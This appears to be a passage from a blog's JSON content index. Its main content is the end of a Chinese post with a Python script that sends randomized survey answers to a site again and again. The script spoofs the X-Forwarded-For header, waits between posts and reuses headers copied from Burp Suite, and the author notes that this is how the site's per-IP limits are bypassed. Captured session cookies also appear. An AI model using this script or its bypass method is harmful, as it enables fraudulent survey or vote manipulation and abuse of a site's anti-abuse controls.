.ASPXANONYMOUS=xwlWYYyD1QEkAAAANGQyY2UwY2QtNmMwMi00YzdjLTkyNjgtYjAwOTJjYzJlZWJhKVHVbWcXUrju0Qwec7aNRZwVtj81; jac43819938=36417905; UM_distinctid=16c6b348da41e1-011e2866b35c748-4c312272-144000-16c6b348da529f; CNZZDATA4478442=cnzz_eid%3D1762370884-1565166375-%26ntime%3D1565166375; Hm_lvt_21be24c80829bd7a683b2c536fcf520b=1565166702; Hm_lpvt_21be24c80829bd7a683b2c536fcf520b=1565166729; jpckey=%u5B66%u5386; LastActivityJoin=43819938,103045812444&apos;, &apos;Connection&apos;: &apos;close&apos; &#125; print(&apos;Using ip:&apos;+header[&apos;x-forwarded-for&apos;]) #submitdata = &quot;1$%s&#125;2$%s&#125;3$%s&quot; % (str(randint(1, 2)), str(randint(1, 4)), str(randint(1, 4))) # data = &#123; # &apos;submitdata&apos;:submitdata # &#125; data = &quot;submitdata=1%24&quot;+str(randint(1,2))+&quot;%7D2%24&quot;+str(randint(1,4))+&quot;%7D3%24&quot;+str(randint(1,4)) print data r = requests.post(url,headers=header,data=data) print r.headers print r.content time.sleep(40) headers从bp抓的包复制即可 绕过方法：使用xff、设置脚本发包的时间间隔 目前脚本很大概率会出现国外ip，可以搜集国内ip 参考链接：https://mochazz.github.io/","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://yoursite.com/tags/爬虫/"}]},{"title":"Start","slug":"start","date":"2019-07-18T03:48:34.000Z","updated":"2019-07-18T11:16:12.822Z","comments":true,"path":"2019/07/18/start/","link":"","permalink":"http://yoursite.com/2019/07/18/start/","excerpt":"","text":"Skr 这次天buuctf做到自闭，看换个博客能不能换个心情:)","categories":[],"tags":[{"name":"start","slug":"start","permalink":"http://yoursite.com/tags/start/"}]}]}